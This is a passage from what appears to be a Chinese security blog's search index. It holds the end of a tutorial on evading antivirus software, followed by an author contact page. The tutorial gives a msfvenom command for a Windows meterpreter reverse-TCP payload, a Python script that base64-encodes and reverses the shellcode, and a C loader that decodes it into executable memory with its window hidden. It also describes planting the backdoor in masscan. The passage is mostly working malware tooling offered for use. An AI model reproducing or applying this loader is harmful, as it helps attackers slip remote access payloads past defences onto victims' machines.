class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span><br><span class="line">        bufin +&#x3D; 4;</span><br><span class="line">        nprbytes -&#x3D; 4;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* Note: (nprbytes &#x3D;&#x3D; 1) would be an error, so just ingore that case *&#x2F;</span><br><span class="line">    if (nprbytes &gt; 1) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nprbytes &gt; 2) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nprbytes &gt; 3) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span><br><span class="line">    &#125;</span><br><span class="line">    *(bufout++) &#x3D; &#39;\0&#39;;</span><br><span class="line">    nbytesdecoded -&#x3D; (4 - nprbytes) &amp; 3;</span><br><span class="line">    return nbytesdecoded;</span><br><span class="line">&#125;</span><br><span class="line">static const char basis_64[] &#x3D;</span><br><span class="line">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int Base64encode_len(int len)</span><br><span class="line">&#123;</span><br><span class="line">    return ((len + 2) &#x2F; 3 * 4) + 1;</span><br><span class="line">&#125;</span><br><span class="line">int Base64encode(char* encoded, const char* string, int len)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    char* p;</span><br><span class="line">    p &#x3D; encoded;</span><br><span class="line">    for (i &#x3D; 0; i &lt; len - 2; i +&#x3D; 3) &#123;</span><br><span class="line">        *p++ &#x3D; basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">        *p++ &#x3D; basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span><br><span class="line">            ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span><br><span class="line">        *p++ &#x3D; basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2) |</span><br><span class="line">            ((int)(string[i + 2] &amp; 0xC0) &gt;&gt; 6)];</span><br><span class="line">        *p++ &#x3D; basis_64[string[i + 2] &amp; 0x3F];</span><br><span class="line">    &#125;</span><br><span class="line">    if (i &lt; len) &#123;</span><br><span class="line">        *p++ &#x3D; basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">        if (i &#x3D;&#x3D; (len - 1)) &#123;</span><br><span class="line">            *p++ &#x3D; basis_64[((string[i] &amp; 0x3) &lt;&lt; 4)];</span><br><span class="line">            &#x2F;&#x2F; *p++ &#x3D; &#39;&#x3D;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            *p++ &#x3D; basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span><br><span class="line">                ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span><br><span class="line">            *p++ &#x3D; basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2)];</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;*p++ &#x3D; &#39;&#x3D;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    *p++ &#x3D; &#39;\0&#39;;</span><br><span class="line">    return p - encoded;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string_change(unsigned char* p) &#123;</span><br><span class="line">    int i, len;</span><br><span class="line">    char temp;</span><br><span class="line">    len &#x3D; strlen(p);</span><br><span class="line">    for (size_t i &#x3D; 0; i &lt; (len &#x2F; 2); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp &#x3D; p[i];</span><br><span class="line">        p[i] &#x3D; p[len - 1 - i];</span><br><span class="line">        p[len - 1 - i] &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MSF生成代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.132.128 lport=4444 -f c -o shell.c</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fd5d71657b90" alt="image-20201212122320561"></p><p>这里用一下base.py处理一下文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,sys</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;#include &lt;string.h&gt;</span></span><br><span class="line"><span class="string">#pragma comment(linker,&quot;/subsystem:\\&quot;Windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span></span><br><span class="line"><span class="string">//windows控制台程序不出黑窗口</span></span><br><span class="line"><span class="string">static const unsigned char pr2six[256] =</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,</span></span><br><span class="line"><span class="string">    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,</span></span><br><span class="line"><span class="string">    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,</span></span><br><span class="line"><span class="string">    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">int Base64decode_len(const char* bufcoded)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int nbytesdecoded;</span></span><br><span class="line"><span class="string">    register const unsigned char* bufin;</span></span><br><span class="line"><span class="string">    register int nprbytes;</span></span><br><span class="line"><span class="string">    bufin = (const unsigned char*)bufcoded;</span></span><br><span class="line"><span class="string">    while (pr2six[*(bufin++)] &lt;= 63);</span></span><br><span class="line"><span class="string">    nprbytes = (bufin - (const unsigned char*)bufcoded) - 1;</span></span><br><span class="line"><span class="string">    nbytesdecoded = ((nprbytes + 3) / 4) * 3;</span></span><br><span class="line"><span class="string">    return nbytesdecoded + 1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int Base64decode(char* bufplain, const char* bufcoded)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int nbytesdecoded;</span></span><br><span class="line"><span class="string">    register const unsigned char* bufin;</span></span><br><span class="line"><span class="string">    register unsigned char* bufout;</span></span><br><span class="line"><span class="string">    register int nprbytes;</span></span><br><span class="line"><span class="string">    bufin = (const unsigned char*)bufcoded;</span></span><br><span class="line"><span class="string">    while (pr2six[*(bufin++)] &lt;= 63);</span></span><br><span class="line"><span class="string">    nprbytes = (bufin - (const unsigned char*)bufcoded) - 1;</span></span><br><span class="line"><span class="string">    nbytesdecoded = ((nprbytes + 3) / 4) * 3;</span></span><br><span class="line"><span class="string">    bufout = (unsigned char*)bufplain;</span></span><br><span class="line"><span class="string">    bufin = (const unsigned char*)bufcoded;</span></span><br><span class="line"><span class="string">    while (nprbytes &gt; 4) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span></span><br><span class="line"><span class="string">        bufin += 4;</span></span><br><span class="line"><span class="string">        nprbytes -= 4;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    /* Note: (nprbytes == 1) would be an error, so just ingore that case */</span></span><br><span class="line"><span class="string">    if (nprbytes &gt; 1) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (nprbytes &gt; 2) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (nprbytes &gt; 3) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    *(bufout++) = &#x27;\\0&#x27;;</span></span><br><span class="line"><span class="string">    nbytesdecoded -= (4 - nprbytes) &amp; 3;</span></span><br><span class="line"><span class="string">    return nbytesdecoded;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">static const char basis_64[] =</span></span><br><span class="line"><span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;</span></span><br><span class="line"><span class="string">int Base64encode_len(int len)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    return ((len + 2) / 3 * 4) + 1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int Base64encode(char* encoded, const char* string, int len)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int i;</span></span><br><span class="line"><span class="string">    char* p;</span></span><br><span class="line"><span class="string">    p = encoded;</span></span><br><span class="line"><span class="string">    for (i = 0; i &lt; len - 2; i += 3) &#123;</span></span><br><span class="line"><span class="string">        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span></span><br><span class="line"><span class="string">        *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span></span><br><span class="line"><span class="string">            ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span></span><br><span class="line"><span class="string">        *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2) |</span></span><br><span class="line"><span class="string">            ((int)(string[i + 2] &amp; 0xC0) &gt;&gt; 6)];</span></span><br><span class="line"><span class="string">        *p++ = basis_64[string[i + 2] &amp; 0x3F];</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (i &lt; len) &#123;</span></span><br><span class="line"><span class="string">        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span></span><br><span class="line"><span class="string">        if (i == (len - 1)) &#123;</span></span><br><span class="line"><span class="string">            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4)];</span></span><br><span class="line"><span class="string">            // *p++ = &#x27;=&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else &#123;</span></span><br><span class="line"><span class="string">            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span></span><br><span class="line"><span class="string">                ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span></span><br><span class="line"><span class="string">            *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2)];</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        //*p++ = &#x27;=&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    *p++ = &#x27;\\0&#x27;;</span></span><br><span class="line"><span class="string">    return p - encoded;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">string_change(unsigned char* p) &#123;</span></span><br><span class="line"><span class="string">    int i, len;</span></span><br><span class="line"><span class="string">    char temp;</span></span><br><span class="line"><span class="string">    len = strlen(p);</span></span><br><span class="line"><span class="string">    for (size_t i = 0; i &lt; (len / 2); i++)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        temp = p[i];</span></span><br><span class="line"><span class="string">        p[i] = p[len - 1 - i];</span></span><br><span class="line"><span class="string">        p[len - 1 - i] = temp;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">main()&#123;</span></span><br><span class="line"><span class="string">    unsigned char init_buf[] = &quot;%s&quot;;</span></span><br><span class="line"><span class="string">    char kekeoyyds_bufs[1024] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="string">    char kekeoyyds_buf[1024] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="string">    string_change(init_buf);</span></span><br><span class="line"><span class="string">    Base64decode(kekeoyyds_bufs, init_buf);</span></span><br><span class="line"><span class="string">    Base64decode(kekeoyyds_buf, kekeoyyds_bufs);</span></span><br><span class="line"><span class="string">    char* dmagic_memory;</span></span><br><span class="line"><span class="string">    dmagic_memory = VirtualAlloc(NULL, sizeof(kekeoyyds_buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span></span><br><span class="line"><span class="string">    memcpy(dmagic_memory, kekeoyyds_buf, sizeof(kekeoyyds_buf));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&quot;开始处理：%s&quot;</span> % sys.argv[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> file:</span><br><span class="line">            shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> file.readlines():</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;unsigned&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> i:</span><br><span class="line">                    shellcode += i.strip(<span class="string">&quot;\n&quot;</span>).strip(<span class="string">&quot;\r&quot;</span>).strip(<span class="string">&quot;;&quot;</span>).strip(<span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">            print(shellcode)</span><br><span class="line">            exec(<span class="string">&#x27;shellcode = b&quot;%s&quot;&#x27;</span> % shellcode)</span><br><span class="line">            shellcode = base64.b64encode(shellcode)</span><br><span class="line">            shellcode = base64.b64encode(shellcode)</span><br><span class="line">            shellcode = shellcode.decode(<span class="string">&quot;utf8&quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+sys.argv[<span class="number">2</span>],<span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> shellcodefile:</span><br><span class="line">                shellcodefile.write(text % shellcode)</span><br><span class="line">                print(<span class="string">&quot;处理完毕：%s&quot;</span> % sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(sys.argv)</span><br><span class="line">        print(<span class="string">&quot;python base.py shell.c shellcode.c&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fd5d73516e9b" alt="image-20201212140625873"></p><p>在头部添加一下取消黑色窗口的小东西。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fd5d7540d294" alt="image-20201212201349803"></p><p>将base64编码函数和反转字符串函数一同复制进来。</p><p><img src="https://img.rruu.net/image/5fd5dacd6ca03" alt="image-20201213171130638"></p><p>右键，重新生成，找到bin目录，查看exe。</p><p><img src="https://img.rruu.net/image/5fd5d76adb1cb" alt="image-20201212150207069"></p><p>放到虚拟机测试一下</p><p><img src="https://img.rruu.net/image/5fd5d788c6df5" alt="image-20201213154141372"></p><p>MSF配置如下</p><p><img src="https://img.rruu.net/image/5fd5d7a8315cb" alt="image-20201213154339599"></p><p>然后要设置一下EnableStageEncoding为ture</p><p><img src="https://img.rruu.net/image/5fd5d7a828eb9" alt="image-20201213154438122"></p><p>效果如下</p><p><img src="https://img.rruu.net/image/5fd5d7b161861" alt="image-20201213154252380"></p><p>总结：shellcode免杀的执行方式不止我上面说的那个，其实还有很多。有兴趣的同学可以去github上看看 <a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a> ，看看26到29。我们上面通过在masscan中植入后门代码来进行免杀，其实就是一个小小的测试。同学们完全可以自己去寻找其他语言开发的代码一样的植入进去。然后通过，反转字符串，xor异或加密，base64加密等等方式来对抗杀软，相互结合使用效果会更好。</p><p>文章使用工具：<a href="https://wwa.lanzous.com/b0a9fcyqh">https://wwa.lanzous.com/b0a9fcyqh</a>  密码:f33v</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="2020/12/23/about/"/>
      <url>2020/12/23/about/</url>
      
        <content type="html"><![CDATA[<p>wechat：Dmagic_hk</p><p>QQ：2933653699</p><p>github：<a href="https://github.com/magisec/">https://github.com/magisec/</a></p><p>交流群：1006218142</p><p>关于我的博客：这个博客我是用来记录日常学习的，一般不出意外，都是一天更新一次。除非当天外出参见活动，或者有事。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
